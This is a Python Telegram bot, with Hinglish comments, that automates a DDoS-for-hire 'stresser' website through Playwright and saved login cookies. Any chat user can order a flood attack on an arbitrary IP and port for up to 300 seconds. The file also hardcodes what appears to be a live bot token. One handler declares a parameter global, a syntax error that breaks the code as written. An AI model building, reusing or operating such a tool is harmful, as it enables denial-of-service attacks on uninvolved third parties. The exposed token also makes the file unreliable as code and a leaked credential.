import os
import json
import asyncio
import threading
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

from playwright.async_api import async_playwright

# ==================== CONFIG ====================
BOT_TOKEN = "8521144614:AAGOvjw0Y4vxgIYuYPOQoszyrdbgErIx_VE"
ADMIN_IDS = [7820814565]  # Apna admin ID
COOKIE_FILE = "session_cookies.json"
WEBSITE_URL = "https://satellitestress.st/attack"
LOGIN_URL = "https://satellitestress.st/login"

# ==================== GLOBAL VARIABLES (Fixed) ====================
playwright = None
browser = None
context = None
page = None
cookies_loaded = False  # ✅ Yeh global variable define kiya

# ==================== COOKIE FUNCTIONS ====================
async def save_cookies(context):
    """Save cookies to file"""
    cookies = await context.cookies()
    with open(COOKIE_FILE, 'w') as f:
        json.dump(cookies, f, indent=2)
    print("✅ Cookies saved!")

async def load_cookies(context):
    """Load cookies from file"""
    global cookies_loaded
    try:
        with open(COOKIE_FILE, 'r') as f:
            cookies = json.load(f)
            await context.add_cookies(cookies)
            print("✅ Cookies loaded from file!")
            cookies_loaded = True
            return True
    except FileNotFoundError:
        print("❌ No cookie file found. Admin needs to login.")
        cookies_loaded = False
        return False
    except Exception as e:
        print(f"❌ Error loading cookies: {e}")
        cookies_loaded = False
        return False

# ==================== BROWSER SETUP ====================
async def start_browser(headless=True):
    """Start Playwright browser"""
    global playwright, browser, context, page
    playwright = await async_playwright().start()
    browser = await playwright.chromium.launch(headless=headless)
    context = await browser.new_context()
    page = await context.new_page()
    
    # Try to load cookies
    await load_cookies(context)
    return page

async def close_browser():
    """Close browser"""
    global playwright, browser, context, page
    if browser:
        await browser.close()
    if playwright:
        await playwright.stop()

# ==================== INIT ON START ====================
async def init_bot():
    """Initialize browser when bot starts"""
    global page, cookies_loaded
    try:
        page = await start_browser(headless=True)  # Start in headless mode
        if cookies_loaded:
            print("✅ Bot ready with cookies.")
        else:
            print("⚠️ No cookies found. Admin must login with /login")
    except Exception as e:
        print(f"❌ Browser init error: {e}")

# ==================== LOGIN COMMAND (Admin only) ====================
async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin manually login karega - pehli baar"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return

    await update.message.reply_text(
        "🔄 **Starting browser for login...**\n"
        "Please complete login in the opened browser window.\n"
        "After login, type `/done` here."
    )

    # Close existing browser and open visible one
    await close_browser()
    asyncio.create_task(do_login())

async def do_login():
    """Actual login process"""
    global page, context, cookies_loaded
    try:
        page = await start_browser(headless=False)  # Visible browser for login
        await page.goto(LOGIN_URL)
        cookies_loaded = False  # Reset until admin confirms
    except Exception as e:
        print(f"Login error: {e}")

async def done(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin ne login kar liya - cookies save karo"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        return

    global cookies_loaded, context
    try:
        await save_cookies(context)
        cookies_loaded = True
        await update.message.reply_text(
            "✅ **Login successful! Cookies saved.**\n"
            "Now users can use `/attack` command."
        )
        # Switch to headless mode
        asyncio.create_task(switch_to_headless())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def switch_to_headless():
    """Browser ko headless mode mein restart karo attacks ke liye"""
    global browser, context, page, cookies_loaded
    await close_browser()
    page = await start_browser(headless=True)
    if cookies_loaded:
        print("✅ Headless browser ready with cookies.")

# ==================== ATTACK COMMAND (All users) ====================
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User attack command - browser reuse karega"""
    global cookies_loaded, page

    if not cookies_loaded:
        await update.message.reply_text("⏳ Bot not ready. Admin needs to login first with /login")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("❌ Use: `/attack <ip> <port> <time>`")
        return

    ip, port_str, time_str = args
    try:
        port = int(port_str)
        duration = int(time_str)
        if port < 1 or port > 65535 or duration < 10 or duration > 300:
            raise ValueError
    except:
        await update.message.reply_text("❌ Invalid port or time (port 1-65535, time 10-300).")
        return

    msg = await update.message.reply_text(f"🔄 Launching attack on `{ip}:{port}` for {duration}s...")

    # Attack in background
    def attack_thread():
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(perform_attack(ip, port, duration, update, context))
        except Exception as e:
            loop.run_until_complete(context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"❌ Attack failed: {e}"
            ))

    threading.Thread(target=attack_thread).start()

async def perform_attack(ip, port, duration, update, context):
    """Actual attack using existing page with cookies"""
    global page
    try:
        # Attack page par jao
        await page.goto(WEBSITE_URL, wait_until='networkidle')
        await page.wait_for_timeout(2000)

        # Input fields find karo
        inputs = await page.query_selector_all('input[type="text"]')
        visible = []
        for inp in inputs:
            if await inp.is_visible():
                visible.append(inp)

        if len(visible) >= 3:
            await visible[0].fill('')
            await visible[0].fill(ip)
            await visible[1].fill('')
            await visible[1].fill(str(port))
            await visible[2].fill('')
            await visible[2].fill(str(duration))

            # Launch button click
            launch_btn = await page.query_selector('button:has-text("Launch")')
            if launch_btn:
                await launch_btn.click()
                await page.wait_for_timeout(2000)
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"✅ **Attack launched!**\n`{ip}:{port}` for {duration}s"
                )
            else:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="❌ Launch button not found."
                )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"❌ Only {len(visible)} input fields found."
            )
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ Attack error: {e}"
        )

# ==================== STATUS COMMAND ====================
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if cookies_loaded:
        await update.message.reply_text("✅ Bot is ready. Cookies loaded.")
    else:
        await update.message.reply_text("⏳ Bot not ready. Admin needs to /login first.")

# ==================== MAIN ====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", status))
    app.add_handler(CommandHandler("login", login))
    app.add_handler(CommandHandler("done", done))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))

    print("="*50)
    print("🤖 PLAYWRIGHT COOKIE BOT (FIXED)")
    print("="*50)
    print("If cookies exist: Bot will load them automatically")
    print("Admin: /login (first time or cookie expired)")
    print("After login, type /done")
    print("Users: /attack ip port time")
    print("="*50)

    # Initialize browser on startup
    asyncio.run(init_bot())

    app.run_polling()

if __name__ == "__main__":
    main()
